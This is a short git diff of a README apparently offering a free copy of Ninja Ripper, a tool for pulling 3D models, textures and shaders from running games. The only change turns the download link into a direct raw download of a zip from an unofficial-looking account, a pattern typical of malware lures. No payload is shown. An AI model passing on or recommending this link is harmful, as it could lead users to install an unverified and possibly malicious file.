@@ -2,7 +2,7 @@
 
 **Extract 3D models, textures, and shaders directly from any running game or 3D application.**
 
-[Click here to download](https://github.com/pascal200162-beep/NinjaRipper-210-Free/blob/main/NinjaRipper%202.10.zip)
+[Click here to download](https://github.com/pascal200162-beep/NinjaRipper-210-Free/raw/refs/heads/main/NinjaRipper%202.10.zip)
 
 Ninja Ripper hooks into the rendering pipeline of a live game session and captures everything the GPU is being told to draw — meshes, textures, and shaders — exactly as they exist in memory. No file-format reverse engineering, no digging through packed archives. If it's on your screen (and sometimes even behind the camera), you can rip it.
 
